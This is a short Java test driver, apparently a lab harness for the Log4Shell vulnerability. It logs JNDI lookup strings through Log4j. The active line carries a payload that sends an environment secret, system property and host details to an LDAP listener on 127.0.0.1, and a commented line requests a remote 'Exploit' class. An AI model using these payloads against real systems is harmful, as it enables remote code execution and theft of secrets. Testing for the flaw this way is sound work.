import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class TestDriver {

  static Logger log = LogManager.getLogger(TestDriver.class.getName());

  public static void main(String[] args) {
    //log.error(args[0]);
    //log.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
    log.error("${jndi:ldap://127.0.0.1:1389/${java:version}---${env:MYPASSWORD}---${sys:MYPROPERTY}---${java:hw}}");
    //log.error("${env:USER}");
  }
}
